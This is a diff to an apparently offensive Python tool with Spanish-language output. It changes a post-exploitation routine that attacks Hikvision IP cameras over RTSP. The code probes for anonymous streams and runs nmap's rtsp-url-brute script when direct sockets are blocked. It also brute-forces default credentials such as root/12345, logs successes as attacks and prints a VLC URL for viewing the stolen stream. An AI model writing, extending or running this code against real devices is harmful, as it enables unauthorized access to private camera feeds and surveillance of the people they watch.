@@ -3897,17 +3897,32 @@ def post_explotacion():
                 ("guest","guest"),("user","user"),("root","12345"),
             ]
 
-            # Primero probar acceso anónimo
+            # Primero probar acceso anónimo via socket
             anon_code = _rtsp_probe(ip, 554, rtsp_paths[0])
             if anon_code == -1:
-                warn(f"No se pudo conectar al puerto 554. RTSP inaccesible.")
+                # Socket bloqueado — usar nmap rtsp scripts como alternativa
+                info(f"Socket TCP bloqueado (firewall). Usando nmap RTSP scripts...")
+                rtsp_nmap = run(
+                    f"nmap -p 554 --script rtsp-url-brute,rtsp-methods {ip} 2>/dev/null",
+                    capture=True
+                ) or ""
+                if rtsp_nmap:
+                    for line in rtsp_nmap.splitlines():
+                        if any(x in line.lower() for x in ["200","url","stream","found","rtsp"]):
+                            print(f"  {GREEN}[RTSP]{END} {line.strip()}")
+                    if "200" in rtsp_nmap:
+                        ok(f"Stream RTSP encontrado via nmap en {ip}:554")
+                        db_log_attack("Hikvision RTSP", ip, "", "", "nmap rtsp-url-brute")
+                        return True
+                warn(f"Puerto 554 filtrado por firewall — cámara no accesible desde esta red.")
+                info(f"Puede que solo sea accesible desde la app móvil Hik-Connect.")
                 return False
             elif anon_code == 200:
                 ok(f"RTSP ANONIMO accesible: rtsp://{ip}:554{rtsp_paths[0]}")
                 db_log_attack("Hikvision RTSP", ip, "", "", "acceso anónimo")
                 return True
             elif anon_code == 401:
-                info(f"RTSP responde 401 — cámara conectada, requiere credenciales. Probando {len(rtsp_creds)} combinaciones...")
+                info(f"RTSP activo — requiere credenciales. Probando {len(rtsp_creds)} combinaciones...")
             else:
                 info(f"RTSP responde código {anon_code} — continuando brute force...")
 
@@ -3928,7 +3943,7 @@ def post_explotacion():
                     break
             if not rtsp_ok:
                 warn(f"RTSP: ninguna credencial por defecto funcionó.")
-                info(f"La cámara tiene contraseña personalizada. Para acceder al stream usa:")
+                info(f"La cámara tiene contraseña personalizada. Para acceder al stream:")
                 info(f"  vlc rtsp://USUARIO:CLAVE@{ip}:554/Streaming/Channels/101")
             return rtsp_ok
 
